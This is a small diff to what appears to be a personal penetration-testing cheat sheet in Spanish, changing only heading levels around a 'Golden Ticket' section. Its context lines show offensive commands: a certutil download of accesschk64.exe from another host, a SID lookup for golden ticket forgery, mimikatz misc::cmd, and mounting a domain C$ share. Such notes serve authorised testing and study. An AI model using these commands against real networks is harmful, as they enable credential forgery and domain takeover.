@@ -148,7 +148,7 @@ certutil.exe -urlcache -split -f "http://192.168.119.168/accesschk64.exe" access
 
 
 
-####Golden Ticket
+###Golden Ticket
 https://www.netwrix.com/how_golden_ticket_attack_works.html
 
 whoami /user >> sacar SID
@@ -257,7 +257,7 @@ mimikatz # misc::cmd
 
 pushd \\domain\c$
 
-#####Fin Golden Ticket
+###Fin Golden Ticket
 
 
 
